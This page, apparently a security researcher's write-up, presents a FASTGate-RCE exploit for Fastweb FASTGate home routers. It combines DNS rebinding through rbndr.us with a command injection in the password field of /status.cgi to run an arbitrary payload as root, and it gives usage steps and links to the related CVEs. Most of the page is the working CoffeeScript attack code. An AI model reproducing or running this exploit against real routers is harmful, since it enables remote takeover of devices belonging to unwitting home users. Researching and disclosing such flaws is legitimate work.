---
title: FASTGate-RCE
description: Abusing DNS to exploit a command injection and obtain root
layout: default
lang: en
prefetch:
  - www.fastweb.it
  - www.exploit-db.com
  - cve.mitre.org
---

This is the combination of already available exploit and attack techniques.


Serve the exploit as the index of a local webserver.
Craft a tailored `payload.shell` to verify the execution.
Open a web browser and visit `7f000001.c0a801fe.rbndr.us`
(switch between localhost and 192.168.1.254).

```coffeescript

ajax = (url, params, hdrs) ->
  try
    req = new XMLHttpRequest

    qs = new URLSearchParams
    if params
      `for (const [key, val] of Object.entries(params)) {
        qs.append(key, val);
      }`
      url += "?#{qs.toString()}"

    req.open 'GET', url, 0
    req.setRequestHeader 'X-Requested-With', 'XMLHttpRequest'
    req.setRequestHeader 'Content-type', 'application/x-www-form-urlencoded'
    if hdrs
      `for (const [key, val] of Object.entries(hdrs)) {
        req.setRequestHeader(key, val);
      }`

    req.send()
    if req.status == 200
      req.responseText
    else
      null

  catch
    null

random_string = (len) ->
  ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
  digits = '0123456789'
  letters = ascii_letters + digits
  result = ''
  for i in [0...len]
    result += letters.charAt Math.random() * letters.length
  return result

exploit = (cmd, token) ->
  params = {
    '_': "#{Math.round (new Date).getTime() / 1000}pytester#{random_string 12}",
    'sessionKey': 'NULL',
    'cmd': '3',
    'nvget': 'login_confirm',
    'username': random_string(4),
    'password': "'; #{cmd} ; #"
  }
  hdrs = {
    'X-XSRF-TOKEN': token,
    'DNT': '1',
    'Cookie': document.cookie
  }
  ajax '/status.cgi', params, hdrs

isthisyou = ->
  ajax '/status.cgi', {
    '_': "#{Math.round Date.getTime / 1000}pytester#{random_string 12}"
  }

class @Payload
  set = ->
    this.code = ajax '/payload.shell' if !isthisyou()
    return
  hasnot = ->
    !this.code?
  get = ->
    this.code

mp = new Payload
mp.set() while mp.hasnot()
token = Math.round Math.random * 100000000000
document.cookie = "XSRF-TOKEN=#{token}"
while true
  if isthisyou()
    exploit mp.get(), token
    break

```


Nothing prevents remote exploitation, root is gained.
Shell shoveling and verification is voluntarily omitted.

## Links

- [http://www.fastweb.it/forum/servizi-rete-fissa-tematiche-tecniche/urgente-vulnerabilita-modem-fastgate-0-00-47-t22720.html](http://www.fastweb.it/forum/servizi-rete-fissa-tematiche-tecniche/urgente-vulnerabilita-modem-fastgate-0-00-47-t22720.html)
- [https://www.exploit-db.com/exploits/44606/](https://www.exploit-db.com/exploits/44606/)
- [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6023](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6023)
- [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20122](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20122)
- [https://github.com/taviso/rbndr](https://github.com/taviso/rbndr)
- [https://github.com/Depau/fastgate-python](https://github.com/Depau/fastgate-python)
- [https://github.com/Nimayer/fastgate-toolkit](https://github.com/Nimayer/fastgate-toolkit)